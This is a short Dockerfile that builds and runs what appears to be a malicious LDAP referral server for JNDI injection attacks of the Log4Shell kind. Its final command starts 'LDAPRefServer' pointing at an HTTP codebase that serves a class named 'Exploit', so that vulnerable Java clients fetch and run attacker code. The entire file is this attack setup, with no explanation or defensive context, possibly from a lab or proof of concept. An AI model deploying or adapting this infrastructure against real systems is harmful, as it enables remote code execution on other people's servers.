FROM eclipse-temurin:latest

RUN apt-get update && apt-get install -y maven
COPY . ./
RUN mvn clean package -DskipTests
CMD java -cp target/ldap-0.0.3-SNAPSHOT-all.jar ldap.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"